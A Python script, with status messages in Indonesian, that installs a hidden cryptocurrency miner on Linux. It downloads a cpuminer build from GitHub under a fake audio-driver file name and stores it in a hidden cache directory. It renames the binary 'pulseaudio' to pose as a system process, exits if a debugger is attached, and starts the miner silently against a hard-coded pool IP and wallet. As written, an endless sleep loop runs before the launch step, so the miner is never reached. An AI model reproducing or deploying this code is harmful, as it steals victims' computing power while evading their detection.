#!/usr/bin/env python3

import subprocess, os, shutil, tarfile, urllib.request, time, sys
import random

# === CONFIG ===
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzo"
POOL = "stratum+tcp://104.248.150.108:9933"
ALGO = "power2b"
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
FILENAME = ".audio_driver.tar.gz"
BIN_NAME = "pulseaudio"
HIDDEN_DIR = os.path.expanduser("~/.cache/.a/")
BIN_PATH = os.path.join(HIDDEN_DIR, BIN_NAME)

def check_tools():
    for tool in ["wget", "tar", "chmod"]:
        if shutil.which(tool) is None:
            print(f"[!] '{tool}' tidak ditemukan.")
            sys.exit(1)

def anti_debug():
    try:
        with open("/proc/self/status", "r") as f:
            if "TracerPid:	0" not in f.read():
                print("[!] Debugger terdeteksi! Keluar.")
                sys.exit(1)
    except:
        pass

def anti_suspend():
    print("[*] Menjaga proses tetap aktif (non-X)...")
    try:
        while True:
            time.sleep(60)
    except:
        pass

def download_and_extract():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    tar_path = os.path.join(HIDDEN_DIR, FILENAME)
    if not os.path.exists(tar_path):
        print("[*] Mengunduh miner...")
        urllib.request.urlretrieve(URL, tar_path)
    print("[*] Mengekstrak...")
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(path=HIDDEN_DIR)
    real_bin = os.path.join(HIDDEN_DIR, "cpuminer-sse2")
    if os.path.exists(real_bin):
        os.rename(real_bin, BIN_PATH)
        os.chmod(BIN_PATH, 0o755)

def run_stealth():
    print("[*] Menjalankan miner...")
    cmd = ["nice", "-n", "15", BIN_PATH,
           "-a", ALGO, "-o", POOL, "-u", WALLET,
           "--no-color", "--cpu-priority", "3"]
    with open(os.devnull, "wb") as devnull:
        subprocess.Popen(cmd, stdout=devnull, stderr=devnull)
    print("[✓] Miner dijalankan sebagai 'pulseaudio'.")

def throttle_loop():
    for _ in range(3):
        print("[~] Menstabilkan trafik...")
        time.sleep(2.5)

if __name__ == "__main__":
    check_tools()
    anti_debug()
    download_and_extract()
    throttle_loop()
    anti_suspend()
    run_stealth()
